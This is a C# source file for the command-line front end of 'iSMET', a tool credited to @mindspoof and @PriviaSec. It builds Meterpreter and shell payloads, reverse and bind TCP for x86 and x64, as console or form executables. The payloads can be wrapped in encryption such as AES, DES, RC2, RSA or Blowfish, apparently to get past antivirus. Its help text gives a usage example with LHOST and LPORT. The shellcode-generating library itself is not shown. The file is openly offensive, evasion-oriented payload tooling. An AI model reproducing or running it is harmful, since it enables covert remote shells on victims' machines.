using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using iSMET.CSharp.Collection;

namespace iSMET.CommandLine
{
    //    ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗
    //    ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║
    //    ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║
    //    ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║
    //    ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║
    //    ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝
    // iSMET - (A)Symmetric Meterpreter Encryption Tool v2.1
    // Author: @mindspoof - @PriviaSec
    class Program
    {
        public static CSharpLibrary.CreateApplications createApp = new CSharpLibrary.CreateApplications();
        static void Main(string[] args)
        {
            var payload = 0;
            var encryption = 0;
            var type = 0;
            var timeout = 0;
            var shellType = 0;
            var lhost = string.Empty;
            var lport = string.Empty;
            var versionNumber = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();
            if (args.Length <= 0)
            {
                RunHelp("");
                Console.ReadLine();
            }
            else
            {
                for (var i = 0; i < args.Length; i++)
                {
                    if (args[i].Contains("p="))
                    {
                        try
                        {
                            var payloadParse = args[i].Split('=');
                            payload = int.Parse(payloadParse[1]);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Payload parameter must be digit only:");
                            throw;
                        }
                    }
                    else if (args[i].Contains("LHOST="))
                    {
                        var lhostParse = args[i].Split('=');
                        lhost = lhostParse[1];
                    }
                    else if (args[i].Contains("LPORT="))
                    {
                        var lportParse = args[i].Split('=');
                        lport = lportParse[1];
                    }
                    else if (args[i].Contains("e="))
                    {
                        try
                        {
                            var encryptionParse = args[i].Split('=');
                            encryption = int.Parse(encryptionParse[1]);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Encryption parameter must be digit only:");
                            throw;
                        }
                    }
                    else if (args[i].Contains("t="))
                    {
                        try
                        {
                            var typeParse = args[i].Split('=');
                            type = int.Parse(typeParse[1]);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Type parameter must be digit only:");
                            throw;
                        }
                    }
                    else if (args[i].Contains("o="))
                    {
                        try
                        {
                            var timeoutParse = args[i].Split('=');
                            timeout = int.Parse(timeoutParse[1]);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Timeout parameter must be digit only:");
                            throw;
                        }
                    }
                    else if (args[i].Contains("s="))
                    {
                        try
                        {
                            var shellTypeParse = args[i].Split('=');
                            shellType = int.Parse(shellTypeParse[1]);
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Timeout parameter must be digit only:");
                            throw;
                        }
                    }
                    else if(args[i].Contains("show"))
                    {
                        RunHelp("--helplist");
                        for (int j = 0; j < args.Length; j++)
                        {
                            if (args[j].Contains("payloads"))
                            {
                                RunHelp("payloads");
                            }
                            else if (args[j].Contains("encryptions"))
                            {
                                RunHelp("encryptions");
                            }
                            else if (args[j].Contains("applications"))
                            {
                                RunHelp("--applications");
                            }
                            else if (args[j].Contains("shelltypes"))
                            {
                                RunHelp("shelltypes");
                            }
                            else if (args[j].Contains("timeouts"))
                            {
                                RunHelp("timeouts");
                            }
                        }
                    }
                }
                if (!string.IsNullOrEmpty(lhost) || !string.IsNullOrEmpty(lport))
                {
                    if ((int)Payload.x86_meterpreter_reverse_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET "+ versionNumber +" - meterpreter/reverse_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_meterpreter_reverse_tcp_rc4 == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET "+ versionNumber +" - meterpreter/reverse_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_meterpreter_bind_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - meterpreter/bind_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.BindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.BindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_shell_reverse_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - shell/reverse_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ShellReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ShellReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_shell_reverse_tcp_rc4 == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - shell/reverse_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ShellReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ShellReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_shell_bind_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - shell/bind_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ShellBindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ShellBindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x86_shell_bind_tcp_rc4 == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - shell/bind_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.ShellBindTcpRc4(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.ShellBindTcpRc4(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_meterpreter_reverse_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/meterpreter/reverse_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_meterpreter_reverse_tcp_rc4 == payload)
                    {
                        Console.WriteLine(
                            $"{Environment.NewLine}iSMET " + versionNumber + " - x64/meterpreter/reverse_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_meterpreter_bind_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/meterpreter/bind_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64BindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64BindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_shell_reverse_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/shell/reverse_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ShellReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ShellReverseTcp(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_shell_bind_tcp == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/shell/bind_tcp payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ShellBindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ShellBindTcp(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_shell_reverse_tcp_rc4 == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/shell/reverse_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ShellReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ShellReverseTcpRc4(lhost, lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                    else if ((int)Payload.x64_shell_bind_tcp_rc4 == payload)
                    {
                        Console.WriteLine($"{Environment.NewLine}iSMET " + versionNumber + " - x64/shell/bind_tcp_rc4 payload generated.");
                        if (type == (int)ApplicationType.ConsoleApplication || type == (int)ApplicationType.ConsoleMemoryMapped)
                        {
                            createApp.x64ShellBindTcpRc4(lport, Convert.ToInt32(encryption), timeout);
                        }
                        else if (type == (int)ApplicationType.FormApplication || type == (int)ApplicationType.FormMemoryMapped)
                        {
                            createApp.x64ShellBindTcpRc4(lport, Convert.ToInt32(encryption), timeout);
                        }
                        Console.WriteLine($"{Environment.NewLine}File Saved: {Directory.GetCurrentDirectory()}\\{createApp.FileName}");
                    }
                }
                Console.ReadLine();
            }
        }
        public static void RunHelp(string variable)
        {
            var versionNumber = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version.ToString();
            Console.WriteLine(Environment.NewLine);
            Console.WriteLine("   ██╗███████╗███╗   ███╗███████╗████████╗    ██╗   ██╗██████╗    ██╗");
            Console.WriteLine("   ██║██╔════╝████╗ ████║██╔════╝╚══██╔══╝    ██║   ██║╚════██╗  ███║");
            Console.WriteLine("   ██║███████╗██╔████╔██║█████╗     ██║       ██║   ██║ █████╔╝  ╚██║");
            Console.WriteLine("   ██║╚════██║██║╚██╔╝██║██╔══╝     ██║       ╚██╗ ██╔╝██╔═══╝    ██║");
            Console.WriteLine("   ██║███████║██║ ╚═╝ ██║███████╗   ██║        ╚████╔╝ ███████╗██╗██║");
            Console.WriteLine("   ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝         ╚═══╝  ╚══════╝╚═╝╚═╝");
            Console.WriteLine("   Author: @mindspoof - @PriviaSec");
            Console.BackgroundColor = ConsoleColor.Black;
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("iSMET.Commandline " + versionNumber);
            if (variable.Contains("payloads"))
            {
                Console.WriteLine("Select Payload: p=");
                Console.WriteLine("0: meterpreter/reverse_tcp");
                Console.WriteLine("1: meterpreter/reverse_tcp_rc4");
                Console.WriteLine("2: meterpreter/bind_tcp");
                Console.WriteLine("3: shell/reverse_tcp");
                Console.WriteLine("4: shell/reverse_tcp_rc4");
                Console.WriteLine("5: shell/bind_tcp");
                Console.WriteLine("6: shell/bind_tcp_rc4");
                Console.WriteLine("7: x64/meterpreter/reverse_tcp");
                Console.WriteLine("8: x64/meterpreter/reverse_tcp_rc4");
                Console.WriteLine("9: x64/meterpreter/bind_tcp");
                Console.WriteLine("10: x64/shell/reverse_tcp");
                Console.WriteLine("11: x64/shell/bind_tcp");
            }
            else if (variable.Contains("encryptions"))
            {
                Console.WriteLine("Select Encryption: e=");
                Console.WriteLine("0: No Encryption");
                Console.WriteLine("1: Base64");
                Console.WriteLine("2: Rijndael / AES");
                Console.WriteLine("3: DES");
                Console.WriteLine("4: 3DES");
                Console.WriteLine("5: RC2");
                Console.WriteLine("6: RSA");
                Console.WriteLine("7: AES-CBC");
                Console.WriteLine("8: Blowfish");
            }
            else if (variable.Contains("applications"))
            {
                Console.WriteLine("Select Type: t=");
                Console.WriteLine("0: Console Application");
                Console.WriteLine("1: Windows Form Application");
                Console.WriteLine("3: ConsoleMappedFile");
                Console.WriteLine("4: FormMappedFile");
            }
            else if (variable.Contains("shelltypes"))
            {
                Console.WriteLine("Select ShellType: s=");
                Console.WriteLine("0: Byte Array");
                Console.WriteLine("1: Dword");
            }
            else if (variable.Contains("helplist") || variable.Contains("show"))
            {
                Console.WriteLine("Select help details");
                Console.WriteLine("payloads");
                Console.WriteLine("encryptions");
                Console.WriteLine("applications");
                Console.WriteLine("shelltypes");
            }
            else if (variable.Contains("timeouts"))
            {
                Console.WriteLine("Set Timeout: Wait time in milliseconds o=");
            }
            Console.WriteLine("Usage: iSMET.CommandLine.exe" + " p=payload e=encryption s=Payload Type t=type o=timeout LHOST=Local Address LPORT=Local Port");
            Console.WriteLine("iSMET.CommandLine.exe p=0 LHOST=192.168.1.1 LPORT=4444 e=3 t=0 s=0 o=5000");
        }
    }
}
